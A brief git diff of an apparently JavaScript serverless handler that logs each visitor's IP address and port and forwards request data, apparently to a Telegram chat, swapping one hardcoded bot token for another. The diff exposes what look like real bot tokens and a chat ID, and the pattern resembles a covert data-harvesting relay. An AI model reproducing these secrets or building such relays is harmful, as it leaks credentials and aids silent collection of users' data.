@@ -2,7 +2,7 @@ export default async function handler(req, res) {
   const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
   const port = req.socket.remotePort;
 
-  const token = "7961668268:AAEGMLMj5TojYl3giXl_C8S0O2zH3Q8IeEU";
+  const token = "8475508915:AAFELUIuxdc9SPrSaZjHucQgE0dN9ET9MZ0";
   const chatId = "7198165253";
 
   let body = {};
@@ -39,3 +39,4 @@ export default async function handler(req, res) {
     res.status(500).send("Error sending data");
   }
 }
+
